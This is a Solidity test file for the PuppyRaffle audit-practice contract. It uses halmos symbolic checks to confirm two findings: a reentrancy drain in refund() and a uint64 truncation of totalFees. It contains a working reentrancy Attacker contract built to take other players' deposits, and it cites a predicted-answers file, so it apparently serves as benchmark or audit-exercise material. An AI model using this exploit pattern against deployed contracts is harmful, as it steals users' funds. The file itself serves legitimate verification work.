// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;
pragma experimental ABIEncoderV2;

import {Test} from "forge-std/Test.sol";
import {PuppyRaffle} from "../PuppyRaffle.sol";

/// Reentrancy attacker for H-1. The malicious `receive()` calls back into
/// `PuppyRaffle::refund` while the protocol is still mid-payout — exploits
/// the CEI violation (external call before the players[i] = address(0) state
/// write).
contract Attacker {
    PuppyRaffle public raffle;
    uint256 public entranceFee;
    uint256 public myIndex;
    uint256 public reentered;

    constructor(PuppyRaffle _raffle, uint256 _entranceFee) {
        raffle = _raffle;
        entranceFee = _entranceFee;
    }

    receive() external payable {
        // Bound the recursion (halmos default --loop 5 also caps depth).
        // Even one extra refund proves the bug.
        if (reentered < 2 && address(raffle).balance >= entranceFee) {
            reentered++;
            raffle.refund(myIndex);
        }
    }

    function enter() external payable {
        address[] memory ps = new address[](1);
        ps[0] = address(this);
        raffle.enterRaffle{value: entranceFee}(ps);
        myIndex = raffle.getActivePlayerIndex(address(this));
    }

    function attack() external {
        raffle.refund(myIndex);
    }
}

/// Symbolic invariants for puppy-raffle. Each `check_*` is a property halmos
/// will either PROVE or refute with a concrete EVM counterexample.
///
/// Predicted verdicts (from .ANSWERS.md):
///   check_refundDoesNotPayTwice     →  COUNTEREXAMPLE   (H-1 reentrancy)
///   check_uint64CastDoesNotLoseFee  →  COUNTEREXAMPLE   (H-3 totalFees uint64 truncation)
contract Properties is Test {
    PuppyRaffle public raffle;
    Attacker public attacker;
    uint256 constant ENTRANCE_FEE = 1 ether;
    address constant FEE_ADDR = address(0xFEE);
    address constant FILLER_A = address(0xA1);
    address constant FILLER_B = address(0xB2);
    address constant FILLER_C = address(0xC3);

    function setUp() public {
        raffle = new PuppyRaffle(ENTRANCE_FEE, FEE_ADDR, 1 weeks);
        attacker = new Attacker(raffle, ENTRANCE_FEE);

        // Fund the raffle with a few legitimate players so the attacker's
        // refund withdraws ETH that ISN'T just their own deposit. (Three
        // filler players are enough; selectWinner needs ≥4 but refund
        // does not, so this is purely "drain other people's funds" setup.)
        vm.deal(FILLER_A, ENTRANCE_FEE);
        vm.deal(FILLER_B, ENTRANCE_FEE);
        vm.deal(FILLER_C, ENTRANCE_FEE);

        address[] memory a = new address[](1); a[0] = FILLER_A;
        vm.prank(FILLER_A); raffle.enterRaffle{value: ENTRANCE_FEE}(a);
        a[0] = FILLER_B;
        vm.prank(FILLER_B); raffle.enterRaffle{value: ENTRANCE_FEE}(a);
        a[0] = FILLER_C;
        vm.prank(FILLER_C); raffle.enterRaffle{value: ENTRANCE_FEE}(a);

        // Fund the attacker and have them enter once.
        vm.deal(address(attacker), ENTRANCE_FEE);
        attacker.enter();
    }

    /// PROMISE (from PuppyRaffle NatSpec): refund returns the entrant's
    /// `entranceFee`, no more. An attacker who entered once cannot drain
    /// more than `entranceFee`. INVARIANT: balance gain from a single
    /// attack call ≤ entranceFee.
    function check_refundDoesNotPayTwice() public {
        uint256 balBefore = address(attacker).balance;
        attacker.attack();
        uint256 balAfter = address(attacker).balance;
        uint256 gained = balAfter - balBefore;
        assert(gained <= ENTRANCE_FEE);
    }

    /// PROMISE (H-3 finding): `totalFees` must accumulate accurately. The
    /// canonical bug is at `PuppyRaffle::selectWinner`:
    ///     totalFees = totalFees + uint64(fee);
    /// where `fee` is a uint256 that can exceed 2**64 - 1 (~18.45 ETH).
    /// The cast LOSES the high bits, so the stored fee no longer equals
    /// the arithmetic fee.
    ///
    /// This test isolates the exact cast — halmos handles BitVec arithmetic
    /// natively, so this version returns a clean COUNTEREXAMPLE instantly.
    /// (A "full setup" version going through selectWinner would also work
    /// but might TIMEOUT on the 4-player array setup; isolating the line
    /// is faithful to the bug-shape without fighting symbolic indirection.)
    ///
    /// Predicted halmos verdict: COUNTEREXAMPLE
    ///     witness: any fee with bit 64 or above set, e.g. fee = 2**64.
    function check_uint64CastDoesNotLoseFee(uint256 fee) public pure {
        // Bound the search: fees larger than 2**128 are physically impossible
        // (more wei than exist), but anything above 2**64-1 triggers the bug.
        if (fee >= (uint256(1) << 128)) return;
        uint64 truncated = uint64(fee);
        assert(uint256(truncated) == fee);
    }
}
